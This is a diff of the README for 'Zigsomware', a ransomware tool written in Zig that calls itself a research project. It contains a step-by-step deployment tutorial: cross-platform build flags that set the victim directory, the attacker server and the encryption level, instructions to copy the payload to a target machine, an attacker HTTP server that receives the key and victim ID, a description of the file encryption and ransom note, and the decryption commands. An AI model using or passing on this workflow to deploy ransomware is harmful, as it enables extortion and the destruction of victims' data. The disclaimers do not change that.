@@ -1,35 +1,40 @@
 # :t-rex: Zigsomware :t-rex:
 
-Zigsomware is a ransomware example written in Zig. This is not practical and is only for research purposes of Zig implementation.
+Zigsomware is a ransomware example written in Zig, for research purpose.  
+Its target is cross-platform, supporting Linux, madOS, Windows, etc.
 
 <br />
 
 ## Features
 
-- Encrypts files with XChaCha20-Poly1305.
-- Downloads a encryption key from a specified server.
-- Decrypts the encrypted files.
+The Zigsomware is composesd of two executable files:
+
+- `zigsom`:
+    - Encrypts files with XChaCha20-Poly1305 algorithm.
+    - Sends the encryption key and the victim ID to the specified server.
+
+- `unlock`:
+    - Decrypts the files that are encrypted by `zigsom`.
 
 <br />
 
 ## Requirements
 
-- Linux
-- Zig version 0.14.0
+- Zig version 0.14.0+
 
 <br />
 
-> ## ATTENTION
+## :warning: ATTENTION
 
-> - The project aims to help security research and educational purposes. Do not use it on any systems not under your control.
-> - Don't use it on your personal machine. Instead, use it on your test environment such as VM.
-> - Anyway, use it at your own risk.
+- The project aims to help security research and educational purposes. Do not use it on any systems not under your control.
+- Don't use it on your personal machine. Instead, use it on your test environment such as VM.
+- Anyway, use it at your own risk.
 
 <br />
 
 # Tutorial
 
-## 1. Install
+## 1. Build
 
 First clone the repository:
 
@@ -41,62 +46,81 @@ cd zigsomware
 And build the project with specified options:
 
 ```sh
-# -DSERVER_HOST: Server address
-# -DSERVER_PORT: Server port
-# -DSERVER_PATH: the url path of the server to download a encryption key.
-zig build -DSERVER_HOST=127.0.0.1 -DSERVER_PORT=4444 -DSERVER_PATH=/
+# -Dtarget: The CPU architecture, OS, and ABI to build for e.g. 'x86_64-linux', 'x86_64-macos', 'x86_64-windows'
+# -Ddir: Path of the directory to start encryption (default: './victim/')
+# -Dserver_host: Server address
+# -Dserver_port: Server port
+# -Dserver_path: The URL path of the server to receive the encryption key and the victim ID.
+# -Dlevel: The level at which Zigsomware encrypts files. The higher the level, the more files will be encrypted. [1: safe, 2: normal, 3: danger] (default: 1)
+zig build \
+-Dtarget=x86_64-windows \
+-Ddir=./victim/ \
+-Dserver_host=127.0.0.1 -Dserver_port=4444 -Dserver_path=/ \
+-Dlevel=1
 ```
 
 As above, we need to specify your server host/port/path for allowing the Zigsomware to download a encryption key. We can also set other servers such as `ngrok`.  
 After that, the executables are generated under `zig-out` directory:
 
 ```sh
-file ./zig-out/x86_64-linux/zigsomware
-file ./zig-out/x86_64-windows/zigsomware.exe
+# e.g.
+file ./zig-out/bin/unlock.exe
+file ./zig-out/bin/zigsom.exe
 ```
 
-## 2. Generate Encryption Key & Host It
+Transfer the `zigsom.exe` to the target machine.  
+Do not transfer the `unlock.exe` yet because it is used for decryption.
 
-Next, generate an encryption key to be used for encryption/decryption.  
-To generate it, run the following command:
+## 2. Start Attacker Server
+
+To receive the encryption key and the victim ID, start the web server in your local machine. Here, we simply run Python HTTP server.
 
 ```sh
-./zig-out/x86_64-linux/zigsomware --genkey
-# output example: cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY=
+python3 -m http.server 4444
 ```
-
-We need to host this key in the server that you have specified when building: `https://<SERVER_HOST>:<SERVER_PORT>/<SERVER_PATH>`.  
-For testing purposes, I created a simple API server (`server/server.py`) so use it this time:
-
-```sh
-cd server
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r requirements.txt
-python3 server.py --port 4444 --key cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY=
-```
-
-As above, we need to set the `--port` and the `--key`.  
-Then this server hosts the encryption key at the root path (`/`). Our `Zigsomware` will donwload the encryption key from the server.  
 
 ## 3. Run Zigsomware (Encryption)
 
-On the target machine, execute the `zigsomware` with the specified target directory to encrypt:
+In the target machine, execute the `zigsom`. We assume that the `victim` directory exist in the current directory.
 
 ```sh
-# -e: Encryption
-./zigsomware -e ./test_dir/
+# Check if the 'victim' directory exists.
+dir .\victim
+
+# Now execute files under the 'victim' directory.
+.\zigsom.exe
 ```
 
-When executed, the `zigsomware` downloads the encryption key from the server that you have specified, then encrypts files udner `./test_dir/` directory and appends ransom extensions (`.zigsom`) to each file.
-A ransom note (`README.txt`) has also been created in the directory.
+When executed, the `zigsom` does the following:
+
+1. Generates the encryption key and encode with Base64.
+2. Sends the Base64-encoded encryption key and the victim ID to our attacker server (`http://127.0.0.1:4444/?id=123456&key=xxxxxxxxxxxxxxxxxx`).
+3. Encrypts files under the `victim` directory that has been specified when `zig build`, using the encryption key.
+4. Adds ransom extensions (`.zigsom`) for each file.
+5. Places a ransom note (`README.txt`) in the `victim` directory.
+
+The encryption key and the victim ID can be seen in our attacker server's log as below:
+
+```txt
+127.0.0.1 - - [08/Sep/2024 21:42:52] "GET /?id=116219480&key=WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y HTTP/1.1" 200 -
+```
+
+This key (`WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y` here) is used for decryption.
+
+*The `zigsom` sends **HTTPS** request at first. If it is failed, the `zigsom` sends **HTTP** request instead.  
 
 ## 4. Decryption
 
-To decrypt the files, run `zigsomware` with `-d` flag and set a **Base64-encoded encryption key** that was sent to our server during encryption:
+To decrypt the files, use `unlock.exe` with the Base64-encoded encryption key in the target machine. We (or rather, the victims) execute `unlock.exe` with the Base64-encoded encryption key and the specified directory (`victim` here):
 
 ```sh
-# -d: Decrypt
 # -k: Base64-encoded encryption key
-./zigsomware -d -k cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY= ./test_dir/
+.\unlock.exe -k WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y .\victim\
 ```
+
+When executed, the `unlock` does the following:
+
+1. Decodes the Base64-encoded encryption key.
+2. Decrypts files under the direcotry (`.\victim\`).
+3. Removes the ransom extension (`.zigsom`) for each file.
+
